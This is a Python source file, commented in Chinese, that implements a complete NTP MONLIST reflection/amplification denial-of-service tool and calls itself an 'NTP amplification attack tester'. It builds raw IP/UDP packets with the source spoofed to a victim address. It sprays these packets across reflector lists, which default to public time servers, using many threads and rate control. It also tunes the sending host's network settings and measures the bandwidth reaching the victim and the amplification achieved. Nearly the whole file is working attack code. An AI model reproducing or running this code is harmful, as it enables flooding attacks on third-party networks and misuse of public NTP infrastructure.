import os
import time
import socket
import struct
import threading
import random
import logging
import traceback
from threading import Lock
from typing import List, Dict, Optional, Callable, Any

# 创建日志记录器
logger = logging.getLogger(__name__)


class NTPServerManager:
    """NTP服务器管理器"""
    
    def __init__(self, servers):
        self.servers = servers
        self.server_stats = {}
        for server in servers:
            self.server_stats[server] = {
                'success': 0,
                'total': 0,
                'score': 0.5
            }
        self.last_update = time.time()

    def get_best_servers(self, count=20):
        """返回评分最高的服务器"""
        current_time = time.time()
        
        # 定期衰减统计
        if current_time - self.last_update > 10:
            self._decay_stats()
            self.last_update = current_time
        
        # 计算服务器得分
        scored_servers = []
        for server, stats in self.server_stats.items():
            if stats['total'] > 0:
                success_rate = stats['success'] / stats['total']
                # 给新服务器一些机会
                score = success_rate * 0.8 + stats['score'] * 0.2
            else:
                score = stats['score']
            
            scored_servers.append((score, server))
        
        # 按得分排序
        scored_servers.sort(reverse=True)
        
        # 返回最好的服务器，但混入一些随机性
        best_count = min(count * 2, len(scored_servers))
        best_servers = [server for _, server in scored_servers[:best_count]]
        random.shuffle(best_servers)
        
        return best_servers[:count]

    def update_stats(self, server, success):
        """更新服务器统计信息"""
        if server not in self.server_stats:
            self.server_stats[server] = {
                'success': 0,
                'total': 0,
                'score': 0.5
            }
        
        self.server_stats[server]['total'] += 1
        if success:
            self.server_stats[server]['success'] += 1
        
        # 更新得分
        if self.server_stats[server]['total'] > 0:
            success_rate = (
                self.server_stats[server]['success'] /
                self.server_stats[server]['total']
            )
            self.server_stats[server]['score'] = success_rate

    def _decay_stats(self):
        """定期衰减统计，让系统能适应变化"""
        for server in self.server_stats:
            stats = self.server_stats[server]
            if stats['total'] > 50:
                # 衰减到原来的80%
                stats['success'] = int(stats['success'] * 0.8)
                stats['total'] = int(stats['total'] * 0.8)


class NTPTester:
    """NTP放大攻击测试器"""
    
    def __init__(self):
        self.is_running = False
        self.stats_callback = None
        self.threads = []
        self.stats_lock = Lock()
        
        # 测试统计信息
        self.test_stats = {
            'packets_sent': 0,
            'packets_received': 0,
            'bytes_sent': 0,
            'bytes_received': 0,
            'current_pps': 0,
            'current_mbps': 0,
            'victim_mbps': 0.0,
            'max_amplification_factor': 0.0,
            'progress_percent': 0
        }
        
        # NTP服务器配置
        self.servers_file = 'servers/ntp.txt'
        self.ntp_servers = []
        
        # 远程监控信息
        self.remote_recv_mbps = 0.0
        self.remote_last_update = 0
        self.max_amplification_factor = 0.0
        
        # 时间记录
        self.start_time = 0
        self.end_time = 0
        
        # NTP配置
        self.ntp_port = 123
        self.monlist_packet_size = 468  # MONLIST请求包大小
        self.expected_amplification = 556  # NTP MONLIST典型放大倍数
        
        # 服务器管理器
        self.server_manager = None
    
    def run_test(self, target_ip: str, target_port: int = 80,
                 duration_minutes: int = 5, threads: int = 8,
                 spoof_source_ip: Optional[str] = None, spoof_source_port: int = 0,
                 data_size_kb: int = 300, target_pps: int = 5000,
                 stats_callback: Optional[Callable[[Dict], None]] = None) -> None:
        
        # 如果没有设置伪造源IP，使用目标IP
        if not spoof_source_ip:
            spoof_source_ip = target_ip
        if spoof_source_port == 0:
            spoof_source_port = target_port
        
        logger.info(f"开始NTP测试")
        logger.info(f"受害者: {target_ip}:{target_port}")
        logger.info(f"伪造源: {spoof_source_ip}:{spoof_source_port}")
        
        self.is_running = True
        self.stats_callback = stats_callback
        self.start_time = time.time()
        self.end_time = self.start_time + (duration_minutes * 60)
        
        try:
            # 加载NTP反射服务器列表
            ntp_servers = self._load_servers()
            if not ntp_servers:
                logger.error("没有可用的NTP服务器")
                return
            
            logger.info(f"加载了 {len(ntp_servers)} 个NTP服务器")
            
            # 初始化服务器管理器
            self.server_manager = NTPServerManager(ntp_servers)
            
            # 优化系统设置
            self._optimize_system()
            
            # 构建NTP MONLIST请求包
            ntp_data = self._build_ntp_monlist_packet()
            
            # 创建原始套接字（需要root权限）
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
                sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 2 * 1024 * 1024)
            except (PermissionError, OSError) as e:
                logger.error(f"创建原始套接字失败，需要root权限: {str(e)}")
                return
            
            # 清理之前的线程
            self.threads = []
            
            # 启动反馈监听线程
            feedback_thread = threading.Thread(target=self._feedback_listener)
            feedback_thread.daemon = True
            feedback_thread.start()
            
            # 启动统计更新线程
            stats_thread = threading.Thread(target=self._stats_updater, args=(self.end_time,))
            stats_thread.daemon = True
            stats_thread.start()
            self.threads.append(stats_thread)
            
            # 计算每个线程的目标PPS
            target_pps_per_thread = max(1, target_pps // threads)
            
            # 启动发送线程
            for i in range(threads):
                t = threading.Thread(
                    target=self._send_worker,
                    args=(
                        i,
                        sock,
                        spoof_source_ip,  # 伪造的源IP（受害者IP）
                        spoof_source_port, # 伪造的源端口（受害者端口）
                        ntp_data,
                        self.end_time,
                        target_pps_per_thread
                    )
                )
                t.daemon = True
                t.start()
                self.threads.append(t)
            
            logger.info(f"启动 {threads} 个发送线程，目标PPS: {target_pps}")
            
            # 等待测试结束
            while self.is_running and time.time() < self.end_time:
                time.sleep(1)
            
            # 清理
            sock.close()
            
            # 等待所有线程结束
            for t in self.threads:
                if t.is_alive():
                    t.join(timeout=2)
            
            logger.info("NTP测试完成")
            
            # 发送最终统计
            if self.stats_callback:
                final_stats = self.test_stats.copy()
                final_stats.update({
                    'victim_mbps': self.remote_recv_mbps,
                    'max_amplification_factor': self.max_amplification_factor,
                    'progress_percent': 100,
                    'expected_amplification': self.expected_amplification
                })
                self.stats_callback(final_stats)
            
        except Exception as e:
            logger.error(f"NTP测试执行错误: {str(e)}\n{traceback.format_exc()}")
            if self.stats_callback:
                self.stats_callback({'error_message': str(e)})
        finally:
            self.is_running = False

    def stop_test(self) -> None:
        """停止测试"""
        self.is_running = False
        logger.info("正在停止NTP测试...")

    def _load_servers(self) -> List[str]:
        """加载NTP服务器列表"""
        servers = []
        
        if os.path.exists(self.servers_file):
            try:
                with open(self.servers_file, 'r') as f:
                    for line in f:
                        line = line.strip()
                        if line and not line.startswith('#'):
                            # 如果是域名，解析为IP
                            if not self._is_ip_address(line):
                                try:
                                    ip = socket.gethostbyname(line)
                                    servers.append(ip)
                                    logger.debug(f"解析域名 {line} -> {ip}")
                                except socket.gaierror:
                                    logger.warning(f"无法解析域名: {line}")
                            else:
                                servers.append(line)
            except Exception as e:
                logger.error(f"加载NTP服务器列表失败: {str(e)}")
        else:
            logger.warning(f"NTP服务器文件不存在: {self.servers_file}")
            # 添加默认NTP服务器
            servers = self._get_default_ntp_servers()
            
        return servers

    def _get_default_ntp_servers(self) -> List[str]:
        """获取默认NTP服务器列表"""
        default_servers = [
            "pool.ntp.org",
            "time.google.com",
            "time.windows.com",
            "time.apple.com",
            "ntp1.aliyun.com",
            "ntp2.aliyun.com",
            "ntp3.aliyun.com"
        ]
        
        servers = []
        for server in default_servers:
            try:
                ip = socket.gethostbyname(server)
                servers.append(ip)
                logger.debug(f"解析默认NTP服务器 {server} -> {ip}")
            except socket.gaierror:
                logger.warning(f"无法解析默认NTP服务器: {server}")
        
        return servers

    def _is_ip_address(self, address: str) -> bool:
        """检查字符串是否为IP地址"""
        try:
            socket.inet_aton(address)
            return True
        except socket.error:
            return False

    def _optimize_system(self):
        """优化系统设置"""
        try:
            # 增加文件描述符限制
            os.system('ulimit -n 65536 2>/dev/null')
            # 优化网络参数
            os.system('sysctl -w net.core.rmem_max=67108864 2>/dev/null')
            os.system('sysctl -w net.core.wmem_max=67108864 2>/dev/null')
            os.system('sysctl -w net.core.netdev_max_backlog=200000 2>/dev/null')
            logger.info("系统优化已应用")
        except:
            logger.warning("系统优化失败")

    def _build_ntp_monlist_packet(self) -> bytes:
        """构建NTP MONLIST请求包"""
        # NTP MONLIST请求包结构
        # LI=0 (无警告), VN=3 (版本3), Mode=7 (私有模式)
        # Response=0 (请求), Error=0, More=0, Op=42 (MON_GETLIST)
        
        # 构建NTP模式7头部（20字节）
        ntp_header = bytearray([
            0x17, 0x00, 0x03, 0x2A,  # LI=0, VN=3, Mode=7, REQ=0x2A (MON_GETLIST)
            0x00, 0x00, 0x00, 0x00,  # Sequence
            0x00, 0x00, 0x00, 0x00,  # Status
            0x00, 0x00, 0x00, 0x00,  # Association ID
            0x00, 0x00, 0x00, 0x00,  # Offset
            0x00, 0x00, 0x00, 0x00,  # Count
        ])
        
        # 填充数据以达到468字节（某些NTP服务器要求的最小大小）
        # 这有助于触发更大的响应
        padding_size = self.monlist_packet_size - len(ntp_header)
        ntp_header.extend(b'\x00' * padding_size)
        
        return bytes(ntp_header)

    def _build_raw_packet(
        self,
        src_ip: str,
        dst_ip: str,
        src_port: int,
        dst_port: int,
        ntp_data: bytes
    ) -> bytes:
        """构建原始IP/UDP数据包"""
        # IP头部
        ip_ver_ihl = 0x45  # IPv4, 头部长度5*4=20字节
        ip_tos = 0
        ip_total_len = 20 + 8 + len(ntp_data)  # IP + UDP + NTP
        ip_id = random.randint(0, 65535)
        ip_flags_frag = 0x4000  # Don't fragment
        ip_ttl = 64
        ip_proto = socket.IPPROTO_UDP
        ip_check = 0
        
        # 转换IP地址为字节
        src_ip_bytes = socket.inet_aton(src_ip)
        dst_ip_bytes = socket.inet_aton(dst_ip)
        
        ip_header = struct.pack(
            '!BBHHHBBH4s4s',
            ip_ver_ihl,
            ip_tos,
            ip_total_len,
            ip_id,
            ip_flags_frag,
            ip_ttl,
            ip_proto,
            ip_check,
            src_ip_bytes,
            dst_ip_bytes
        )
        
        # UDP头部
        udp_src = src_port or random.randint(1024, 65535)
        udp_dst = dst_port
        udp_len = 8 + len(ntp_data)
        udp_check = 0
        
        udp_header = struct.pack('!HHHH', udp_src, udp_dst, udp_len, udp_check)
        
        return ip_header + udp_header + ntp_data

    def _send_worker(
        self,
        worker_id: int,
        sock: socket.socket,
        src_ip: str,
        src_port: int,
        ntp_data: bytes,
        end_time: float,
        target_pps_per_thread: int
    ):
        """发送工作线程"""
        logger.debug(f"NTP发送线程 {worker_id} 启动")
        
        if not self.server_manager:
            logger.error(f"线程 {worker_id}: 服务器管理器未初始化")
            return
        
        # 获取最佳服务器列表
        best_servers = self.server_manager.get_best_servers(30)
        if not best_servers:
            logger.error(f"线程 {worker_id}: 没有可用的NTP服务器")
            return
        
        packet_count = 0
        batch_size = max(5, min(20, target_pps_per_thread // 20))
        
        # 预构建数据包缓存
        packet_cache = {}
        
        try:
            while self.is_running and time.time() < end_time:
                batch_packets = 0
                batch_bytes = 0
                batch_start = time.time()
                
                # 发送一个批次
                for _ in range(batch_size):
                    if not self.is_running or time.time() >= end_time:
                        break
                    
                    # 从最佳服务器中选择
                    dst_ip = random.choice(best_servers)
                    
                    # 从缓存获取或构建数据包
                    if dst_ip in packet_cache:
                        packet_data = packet_cache[dst_ip]
                    else:
                        packet_data = self._build_raw_packet(
                            src_ip=src_ip,
                            dst_ip=dst_ip,
                            src_port=src_port,
                            dst_port=123,  # NTP服务器端口固定为123
                            ntp_data=ntp_data
                        )
                        packet_cache[dst_ip] = packet_data
                    
                    try:
                        sock.sendto(packet_data, (dst_ip, 0))
                        batch_packets += 1
                        batch_bytes += len(packet_data)
                        
                        # 标记服务器成功
                        self.server_manager.update_stats(dst_ip, True)
                        
                    except Exception as e:
                        # 标记服务器失败
                        self.server_manager.update_stats(dst_ip, False)
                        # 从最佳服务器列表中移除失败的服务器
                        if dst_ip in best_servers:
                            best_servers.remove(dst_ip)
                        # 如果最佳服务器列表太小，重新获取
                        if len(best_servers) < 10:
                            new_servers = self.server_manager.get_best_servers(30)
                            best_servers = list(set(best_servers + new_servers))[:30]
                            # 更新缓存
                            for server in new_servers:
                                if server not in packet_cache:
                                    packet_cache[server] = self._build_raw_packet(
                                        src_ip=src_ip,
                                        dst_ip=server,
                                        src_port=src_port,
                                        dst_port=123,
                                        ntp_data=ntp_data
                                    )
                
                # 更新统计
                with self.stats_lock:
                    self.test_stats['packets_sent'] += batch_packets
                    self.test_stats['bytes_sent'] += batch_bytes
                packet_count += batch_packets
                
                # 智能速率控制
                batch_time = time.time() - batch_start
                expected_batch_time = (
                    batch_size / target_pps_per_thread
                    if target_pps_per_thread > 0
                    else 0.1
                )
                
                if batch_time < expected_batch_time:
                    sleep_time = expected_batch_time - batch_time
                    if sleep_time > 0:
                        time.sleep(sleep_time)
                
                # 定期更新最佳服务器列表和缓存
                if packet_count % 50 == 0:
                    new_servers = self.server_manager.get_best_servers(30)
                    # 合并并去重
                    best_servers = list(set(best_servers + new_servers))[:30]
                    # 更新缓存
                    for server in new_servers:
                        if server not in packet_cache:
                            packet_cache[server] = self._build_raw_packet(
                                src_ip=src_ip,
                                dst_ip=server,
                                src_port=src_port,
                                dst_port=123,
                                ntp_data=ntp_data
                            )
        
        except Exception as e:
            logger.error(f"NTP发送线程 {worker_id} 错误: {str(e)}\n{traceback.format_exc()}")
        
        logger.debug(f"NTP发送线程 {worker_id} 结束，发送了 {packet_count} 个包")

    def _feedback_listener(self):
        """反馈监听线程"""
        listen_port = 9999
        
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.bind(('0.0.0.0', listen_port))
            sock.settimeout(2.0)  # 2秒超时
            logger.info(f"NTP反馈监听线程启动，端口 {listen_port}")
        except Exception as e:
            logger.error(f"无法启动NTP反馈监听线程: {str(e)}")
            return
        
        while self.is_running:
            try:
                data, _ = sock.recvfrom(1024)
                # 解析收到的带宽数据
                try:
                    val = float(data.decode().strip())
                    with self.stats_lock:
                        self.remote_recv_mbps = val
                        self.remote_last_update = time.time()
                        self.test_stats['victim_mbps'] = val
                except ValueError:
                    pass
                    
            except socket.timeout:
                pass  # 超时正常，继续循环
            except Exception:
                pass
        
        sock.close()
        logger.debug("NTP反馈监听线程结束")

    def _stats_updater(self, end_time: float):
        """统计更新线程"""
        logger.debug("NTP统计更新线程启动")
        
        last_packets_sent = 0
        last_bytes_sent = 0
        last_update_time = time.time()
        
        while self.is_running and time.time() < end_time:
            try:
                time.sleep(2)  # 每2秒更新一次
                
                current_time = time.time()
                time_diff = current_time - last_update_time
                
                if time_diff > 0:
                    with self.stats_lock:
                        current_packets_sent = self.test_stats['packets_sent']
                        current_bytes_sent = self.test_stats['bytes_sent']
                        
                        # 计算PPS
                        packets_diff = current_packets_sent - last_packets_sent
                        pps = packets_diff / time_diff
                        
                        # 计算带宽 (Mbps)
                        bytes_diff = current_bytes_sent - last_bytes_sent
                        mbps = (bytes_diff * 8) / (time_diff * 1_000_000)
                        
                        # 更新统计
                        self.test_stats['current_pps'] = pps
                        self.test_stats['current_mbps'] = mbps
                        
                        # 获取远程数据
                        victim_mbps = self.remote_recv_mbps
                        last_update = self.remote_last_update
                        
                        # 判断数据是否新鲜 (超过3秒没收到汇报，认为连接中断)
                        is_data_fresh = (current_time - last_update) < 3.0
                        
                        # 计算实际放大倍数
                        if mbps > 0.1 and is_data_fresh:
                            real_af = victim_mbps / mbps if mbps > 0 else 0
                            
                            # 更新历史最高记录
                            if real_af > self.max_amplification_factor:
                                self.max_amplification_factor = real_af
                                self.test_stats['max_amplification_factor'] = real_af
                        
                        # 计算进度
                        elapsed = current_time - self.start_time
                        total = end_time - self.start_time
                        progress_percent = (
                            min(100, (elapsed / total * 100))
                            if total > 0
                            else 0
                        )
                        self.test_stats['progress_percent'] = progress_percent
                        
                        # 回调通知
                        if self.stats_callback:
                            stats_copy = self.test_stats.copy()
                            stats_copy.update({
                                'victim_mbps': victim_mbps,
                                'is_data_fresh': is_data_fresh,
                                'max_amplification_factor': self.max_amplification_factor,
                                'progress_percent': progress_percent,
                                'expected_amplification': self.expected_amplification
                            })
                            self.stats_callback(stats_copy)
                        
                        # 更新最后的值
                        last_packets_sent = current_packets_sent
                        last_bytes_sent = current_bytes_sent
                        last_update_time = current_time
                
            except Exception as e:
                logger.error(f"NTP统计更新错误: {str(e)}")
        
        logger.debug("NTP统计更新线程结束")

    def _get_local_ip(self) -> str:
        """获取本地IP地址"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "127.0.0.1"

    def get_stats(self) -> Dict[str, Any]:
        """获取当前统计信息"""
        with self.stats_lock:
            stats_copy = self.test_stats.copy()
            stats_copy.update({
                'remote_recv_mbps': self.remote_recv_mbps,
                'remote_last_update': self.remote_last_update,
                'max_amplification_factor': self.max_amplification_factor,
                'is_data_fresh': (time.time() - self.remote_last_update) < 3.0,
                'expected_amplification': self.expected_amplification
            })
            return stats_copy

    def get_server_count(self) -> int:
        """获取可用的NTP服务器数量"""
        return len(self.ntp_servers) if self.ntp_servers else 0

    def cleanup(self) -> None:
        """清理资源"""
        self.is_running = False
        
        # 等待线程结束
        for thread in self.threads:
            if thread.is_alive():
                thread.join(timeout=2)
        
        logger.info("NTP测试资源清理完成")


def main():
    """主函数"""
    logging.basicConfig(
        level=logging.INFO,
        format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
    )
    
    tester = NTPTester()
    
    def print_stats(stats):
        """打印统计信息"""
        print(
            f"\r发送: {stats['packets_sent']} 包 | "
            f"速率: {stats['current_pps']:.0f} pps | "
            f"带宽: {stats['current_mbps']:.2f} Mbps | "
            f"受害机接收: {stats.get('victim_mbps', 0):.2f} Mbps | "
            f"进度: {stats.get('progress_percent', 0):.1f}%",
            end=""
        )
    
    try:
        print("=" * 70)
        print("NTP测试模块 - 单元测试")
        print("=" * 70)
        print("协议: NTP MONLIST放大攻击")
        print("持续时间: 30秒")
        print("线程数: 2")
        print("目标PPS: 100")
        print("请求包大小: 468字节")
        print(f"预期放大倍数: {tester.expected_amplification}x")
        print("=" * 70)
        
        # 运行一个简短的测试
        tester.run_test(
            target_ip="127.0.0.1",  # 受害者IP
            target_port=80,         # 受害者端口
            duration_minutes=0.5,   # 30秒
            threads=2,
            target_pps=100,
            spoof_source_ip="127.0.0.1",  # 伪造的源IP（受害者IP）
            spoof_source_port=9999,       # 伪造的源端口
            stats_callback=print_stats
        )
        
        print("\n" + "=" * 70)
        print("测试完成!")
        
        # 显示最终统计
        stats = tester.get_stats()
        print(f"总发送包数: {stats['packets_sent']}")
        print(f"总发送数据: {stats['bytes_sent'] / (1024*1024):.2f} MB")
        print(f"平均发送速率: {stats['current_pps']:.0f} pps")
        print(f"平均带宽: {stats['current_mbps']:.2f} Mbps")
        
        if stats['victim_mbps'] > 0:
            print(f"受害机接收带宽: {stats['victim_mbps']:.2f} Mbps")
        
        if stats['max_amplification_factor'] > 0:
            print(f"最大放大倍数: {stats['max_amplification_factor']:.2f}x")
            print(f"预期放大倍数: {stats['expected_amplification']}x")
            efficiency = (
                stats['max_amplification_factor'] /
                stats['expected_amplification'] * 100
            )
            print(f"效率: {efficiency:.1f}%")
        
        print(f"可用服务器数: {tester.get_server_count()}")
        print("=" * 70)
        
    except KeyboardInterrupt:
        print("\n\n测试被用户中断 (Ctrl+C)")
        tester.stop_test()
    except Exception as e:
        print(f"\n测试错误: {str(e)}")
        traceback.print_exc()
    finally:
        # 清理资源
        tester.cleanup()
        print("资源清理完成")


if __name__ == "__main__":
    main()